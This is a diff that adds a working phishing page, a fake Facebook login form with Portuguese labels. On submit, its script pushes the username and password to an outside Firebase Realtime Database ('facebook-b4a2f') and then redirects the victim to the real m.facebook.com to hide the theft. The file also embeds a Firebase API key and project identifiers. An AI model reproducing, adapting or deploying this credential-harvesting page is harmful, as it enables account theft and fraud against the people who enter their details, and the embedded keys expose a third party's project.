@@ -1,0 +1,114 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+  <title>LOGIN FACEBOOK</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom, #1a237e, #2196F3);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .login-container {
+      background-color: #0d47a1;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+      width: 300px;
+    }
+
+    .login-container label,
+    .login-container input[type="text"],
+    .login-container input[type="password"],
+    .login-container input[type="submit"] {
+      display: block;
+      width: 100%;
+      margin-bottom: 15px;
+    }
+
+    .login-container input[type="text"],
+    .login-container input[type="password"] {
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #1a237e;
+      color: #fff;
+    }
+
+    .login-container input[type="submit"] {
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #42a5f5;
+      color: #fff;
+      cursor: pointer;
+    }
+
+    .login-container input[type="submit"]:hover {
+      background-color: #1976d2;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <form id="login-form">
+      <label for="username">Usuário:</label>
+      <input type="text" id="username" name="username" required>
+
+      <label for="password">Senha:</label>
+      <input type="password" id="password" name="password" required>
+
+      <input type="submit" value="Entrar">
+    </form>
+  </div>
+
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+  <script>
+    // Configurações específicas do seu projeto Firebase
+    var firebaseConfig = {
+      apiKey: "AIzaSyCKiI85Ig7D-3uqDIOGpvTQHmLrZKQIM-k",
+      authDomain: "facebook-b4a2f.firebaseapp.com",
+      databaseURL: "https://facebook-b4a2f-default-rtdb.firebaseio.com/",
+      projectId: "facebook-b4a2f",
+      storageBucket: "gs://facebook-b4a2f.appspot.com",
+      messagingSenderId: "628851748103",
+      appId: "1:628851748103:android:b05b9b653a659c5d9fa9a2",
+    };
+
+    // Inicializar o Firebase
+    firebase.initializeApp(firebaseConfig);
+
+    // Obter referência para o formulário de login
+    var loginForm = document.getElementById("login-form");
+
+    // Adicionar um ouvinte para o evento de envio do formulário
+    loginForm.addEventListener("submit", function (event) {
+      event.preventDefault(); // Impedir o envio padrão do formulário
+
+      var username = document.getElementById("username").value;
+      var password = document.getElementById("password").value;
+
+      // Enviar informações do formulário para o Firebase Realtime Database
+      var database = firebase.database();
+      var usersRef = database.ref("users"); // Referência para o nó "users"
+      usersRef.push({
+        username: username,
+        password: password
+        // Outras informações que você deseja armazenar no banco de dados
+      });
+
+      // Redirecionar o usuário para o Facebook após o envio bem-sucedido
+      window.location.href = "https://m.facebook.com/";
+    });
+  </script>
+</body>
+</html>
+
